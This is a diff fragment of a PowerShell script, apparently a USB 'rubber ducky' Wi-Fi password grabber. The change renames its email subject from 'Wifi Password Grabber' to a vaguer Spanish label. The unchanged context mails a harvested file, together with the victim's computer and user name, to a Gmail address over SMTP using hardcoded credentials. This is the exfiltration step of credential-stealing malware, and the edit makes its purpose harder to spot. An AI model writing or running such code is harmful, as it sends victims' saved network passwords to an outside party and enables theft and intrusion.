@@ -20,8 +20,8 @@ $TO = "patitodegoma404@gmail.com"
 
 $PC_NAME = "$env:computername"
 $USER_NAME = "$env:UserName"
-$SUBJECT = "Wifi Password Grabber - " + $PC_NAME + " " + $USER_NAME
-$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " from " + $USER_NAME + " are in the attached file."
+$SUBJECT = "El patito de - " + $PC_NAME + " " + $USER_NAME
+$BODY = "Info de " + $PC_NAME + " from " + $USER_NAME + " adjuntada."
 $ATTACH = "C:\IT\info.txt"
 
 Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
